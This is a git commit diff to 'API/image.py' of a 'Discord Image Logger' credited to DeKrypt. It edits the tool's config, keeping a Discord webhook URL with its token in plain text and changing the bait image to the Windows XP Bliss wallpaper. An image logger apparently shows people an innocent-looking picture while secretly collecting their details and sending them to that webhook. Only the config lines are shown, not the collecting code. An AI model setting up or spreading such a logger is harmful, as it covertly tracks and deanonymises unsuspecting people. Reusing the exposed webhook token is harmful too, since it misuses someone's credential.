12a8de8a78482338af142bcb1e58ab4cef219a86
hollowedout <oglocgrove.st.gang@gmail.com>
2025-02-16 10:25:03 -0800

    Update image.py

--- API/image.py
+++ API/image.py
@@ -1,4 +1,3 @@
-
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
@@ -13,7 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340738411883008033/ESatuk2tgqVdWCoVvogEKI0pcEBcHEqkmcQbDcMeIXgYltsjDQCbPLCsJQZeB28O1cR6",    "image": "https://media1.tenor.com/m/ROLoNM_N1icAAAAd/loading-discord-discord-loading.gif", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1340738411883008033/ESatuk2tgqVdWCoVvogEKI0pcEBcHEqkmcQbDcMeIXgYltsjDQCbPLCsJQZeB28O1cR6",
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
